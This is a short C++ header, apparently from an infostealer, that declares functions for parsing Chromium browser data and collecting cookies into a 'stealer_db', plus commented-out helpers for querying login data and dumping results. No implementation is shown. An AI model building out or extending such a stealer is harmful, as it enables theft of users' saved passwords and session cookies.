#ifndef CHROMIUMPARSER_H
#define CHROMIUMPARSER_H

#include "DataHolder.h"
#include "DataDump.h"
#include "ChromiumDecryptor.h"

BOOL chromium_parser(std::string username, std::string stealer_db);
BOOL chromium_cookie_collector(std::string username, std::string stealer_db);
//sqlite3_stmt* query_database(std::string target_login_data, const char* database_query);
//BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile);
//bool dump_data(const std::string& db_path, DataHolder* data_array, int data_index);

#endif /* CHROMIUMPARSER_H */
